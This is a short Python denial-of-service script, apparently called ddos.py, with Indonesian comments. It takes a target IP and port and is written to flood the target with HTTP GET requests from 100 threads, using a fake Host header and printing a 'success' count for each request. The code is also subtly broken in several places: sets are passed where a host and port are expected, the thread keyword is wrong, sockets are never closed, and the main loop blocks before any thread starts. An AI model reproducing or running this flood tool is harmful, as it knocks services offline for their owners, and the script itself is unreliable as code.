import threading
import socket
import argparse

parser = argparse.ArgumentParser(description='usage : python3 ddos.py -vct <ip> -vpt <port>')

parser.add_argument('-vct', type=str, help='IP')
parser.add_argument('-vpt', type=str, help='PORT')

# Mendapatkan argumen dari baris perintah
args = parser.parse_args()

# Menggunakan argumen yang diberikan
if args.vct is not None and args.vpt is not None:
    attack_num = 0
    fk = '192.161.4.1'
    a1 = {args.vct}
    a2 = {args.vpt}
    byte = 90000
    def flood():
        while True:
            soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            soc.connect(a1)
            soc.sendto(("GET /"+a1+" HTTP/1.1\r\n").encode("ascii"), (a1, a2))
            soc.sendto(("Host: "+fk+"\r\n\r\n").encode("ascii"), (a1, a2))
            global attack_num
            attack_num += 1
            print(f"Target Success Attacked {a1} And {a2} {attack_num}")
            soc.close
    def main():
        flood()
        for i in range(100):
            thread = threading.Thread(victim=flood)
            thread.start()

    if __name__ == '__main__':
         main()